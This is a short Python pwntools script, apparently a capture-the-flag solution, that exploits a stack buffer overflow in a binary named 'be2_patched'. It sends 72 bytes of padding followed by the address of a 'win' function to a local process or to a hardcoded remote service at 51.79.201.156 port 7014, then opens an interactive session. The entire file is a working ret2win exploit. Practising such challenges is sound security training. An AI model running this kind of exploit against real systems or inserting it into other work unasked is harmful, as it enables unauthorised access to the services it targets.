#!/usr/bin/env python3

from pwn import *

exe = ELF("./be2_patched", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("51.79.201.156", 7014)

    return r


def main():
    r = conn()

    # good luck pwning :)
    offset = 72
    ret2win_addr = exe.symbols['win']
    log.info(f"Target ret2win_addr: {hex(ret2win_addr)}")

    payload = flat(
        b'A' * offset,
        ret2win_addr
        )

    r.sendlineafter(b'reach it?\n', payload)

    r.interactive()


if __name__ == "__main__":
    main()
